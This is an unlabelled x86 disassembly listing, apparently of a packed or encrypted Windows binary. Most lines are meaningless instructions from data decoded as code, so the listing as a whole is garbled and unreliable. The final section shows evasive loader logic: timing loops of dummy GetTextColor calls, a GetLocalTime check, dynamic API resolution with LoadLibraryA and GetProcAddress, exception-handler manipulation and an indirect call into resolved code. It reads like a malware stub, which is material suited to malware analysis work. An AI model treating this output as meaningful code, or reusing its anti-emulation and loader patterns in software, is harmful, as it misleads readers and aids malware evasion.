and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
push ebp
jb r-xdata
clc
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x7272721d ]
jb r-xdata
loop r-xdata
loop r-xdata
add [ eax ] al
jb r-xdata
jb r-xdata
sbb eax 0xb11dd11d
or esp [ eax + 0x28 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ch [ eax + 0xb1d1d13 ]
or [ esi ] eax
sbb [ bx + di + 0x1d ] ecx
cli
in eax dx
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ecx 0x6b849188
mov edi 0x6b84b94a
mov edi 0x6100b48
add eax 0xaf691d1d
0x1f1a676f 0x1d1d
or bh dl
imul edi [ edi - 0x7bc796c0 ] 0x6b
mov edi 0x9688b946
test [ ebx - 0x41 ] ch
inc esp
jb r-xdata
jb r-xdata
xchg ebx eax
jb r-xdata
sbb eax 0x1d3f7a0b
sbb eax 0x72727272
mov dl 0x6f
sbb eax 0x971d721d
jb r-xdata
jb r-xdata
loop r-xdata
and eax 0xb48c3ea7
scasd [ edi ]
scasd [ edi ]
or dh ch
add ebx [ 0xffffffffb9bcbd1d ]
and ch ch
in al 0x26
sbb eax 0x36af6f1d
outsd
cmpsd [ esi ] [ edi ]
or ecx [ es : esi + 0x27 ]
sbb eax 0xb41d721d
fisubr [ ecx + 0x3a ]
or ebx [ edi + 0x28 ]
sbb ebx [ 0x7272721d ]
jb r-xdata
xchg edx eax
mov ebp 0x25699088
test [ ebx - 0x59 ] ch
test [ ebx ] 0x37
jb r-xdata
jb r-xdata
nop
nop
push 0x0
in al dx
jb r-xdata
retn
jb r-xdata
popad
and al ah
test [ edi + 0x22 ] ah
in eax dx
xor ax 0x1d06
sbb eax 0x84e055ed
jb r-xdata
or esp [ ecx + 0x32 ]
sbb eax 0x7272721d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cli
and ebx [ 0x7272721d ]
jb r-xdata
out dx eax
loop r-xdata
push es
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
jb r-xdata
pop ebp
jb r-xdata
push ebp
imul ecx [ esi ] 0x69f60e61
adc ah dl
loop r-xdata
imul edi [ edx ] 0x32a76b84
or ecx [ edx + eax + 0x72721d1d ]
jb r-xdata
add [ eax + 0x1d ] cl
sbb eax 0x84bb3c69
imul edi [ edi - 0x7bc596aa ] 0x6b
cmpsd [ esi ] [ edi ]
xor cl [ ebx ]
mov [ edx ] es
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xfa
0x1d22 0xb1d
and ch ch
mov [ fs : eax ] esp
add [ ebx ] dh
jb r-xdata
rcl [ ebp - 0x75 ] 0xec
jb r-xdata
sbb eax 0x72727272
mov ch dl
loopne r-xdata
or ebx [ edi + 0x6f1d1d08 ]
cmpsb [ esi ] [ edi ]
sar dl cl
jb r-xdata
iretd
jb r-xdata
test bl bl
jb r-xdata
jb r-xdata
loop r-xdata
and [ 0x7272721d ] ebx
jb r-xdata
mov ebx 0x920b2267
loop r-xdata
mov [ rw-data ] 0x70ec
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
push 0x0
call GetTextColor
jmp r-xdata
jae r-xdata
or cl [ ebx * 2 + 0x67bb1d1d ]
and ch ch
in eax 0x5d
retn 0x4
in eax dx
mov cl 0xb5
or esi [ esi + 0xb1d1d5b ]
adc [ eax + 0x1d ] ebx
mov ebx 0xba222d1
imul ebp [ edi ] 0x72721d1d
jb r-xdata
sbb edx [ esi + 0x1d ]
cmpsd [ esi ] [ edi ]
push ss
or edx [ ebp + 0x58 ]
sbb eax 0xdb72721d
cdq
fsubp st5
les ecx [ di + 0x1d ]
outsd
mov esp 0xbfbd2569
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x72727272
rcl [ ebp + 0x68 ] 0x72
jb r-xdata
mov ebp esp
jb r-xdata
cli
or [ 0xffffffffd2a66f1d ] bl
mov cl 0x1d
mov ah 0xde
or esp edi
lahf
jb r-xdata
salc
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
mov ah 0xa
test al 0x13
sbb eax 0x6090b1d
or cl [ eax ]
inc esp
sbb eax 0xee26611d
loop r-xdata
mov [ rw-data ] 0x5b8b
nop
mov [ rw-data ] 0x1
or edx [ ecx + 0x4e ]
jb r-xdata
push r-xdata
jb r-xdata
jb r-xdata
xor ch [ edi + 0x67 ]
bound ebx [ edi ]
jb r-xdata
sbb eax 0x6772721d
and cl [ ebx ]
sbb eax 0x721d1d4e
jb r-xdata
sbb eax 0xbb6d008a
mov edx 0x4a130bb5
adc [ 0x7272721d ] ebx
jb r-xdata
sbb eax 0xe70bdeb4
scasw [ edi ]
loop r-xdata
nop
nop
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x1a99
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
sbb eax 0xbb5fab5
jb r-xdata
in eax 0x45
jb r-xdata
xor eax eax
jb r-xdata
bound ebx [ bx ]
jb r-xdata
mov [ rw-data ] 0x3177
nop
push 0x0
call GetTextColor
mov [ rw-data ] 0x1
nop
nop
jmp r-xdata
add [ edi + edi * 8 + 0x30 ] ah
jb r-xdata
push ebp
jb r-xdata
pop ds
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x8a0c
jne r-xdata
nop
push 0x0
call GetTextColor
nop
nop
mov eax 0x1fd3a51b
call sub_4026bc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
sbb eax 0x441d0bb1
jb r-xdata
mov [ rw-data ] 0x1
jb r-xdata
mov ah 0xe2
inc ebp
add bl al
jmp r-xdata
inc ebp
jb r-xdata
or ebx [ 0x721d1d44 ]
jb r-xdata
jb r-xdata
mov ecx 0x8e
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403174
jae r-xdata
and [ ebx + 0x461bd82d ] al
jb r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
push [ fs : eax ]
jb r-xdata
mov edi 0x721d1d1c
sbb eax 0xb2a691d
jb r-xdata
inc esp
jb r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_40316c
sub eax rw-data
jb r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403658
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub [ rw-data ] 0x1
xor [ ecx + ecx * 4 + 0x20 ] ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
shl [ edx ] 0x1
mov [ 0x1d08ee0b ] al
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1fd39246
jne r-xdata
call sub_403174
add [ edi ] ecx
sbb eax [ esi ]
jb r-xdata
mov [ eax ] esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
and ah [ edx + 0x1d08ee0b ]
mov [ ebx + ebp * 2 - 0x77474349 ] es
xchg [ ebx ] cl
jb r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
mov [ rw-data ] 0x1
add [ ecx ] al
jb r-xdata
jb r-xdata
cmp [ edx ] cl
sbb eax 0x7272721d
jb r-xdata
push 0x0
call GetTextColor
inc [ rw-data ]
cmp [ rw-data ] 0x89ed
jne r-xdata
xor eax eax
mov [ rw-data ] eax
nop
push rw-data
call [ rw-data ]
nop
jb r-xdata
fcomp [ ebx ]
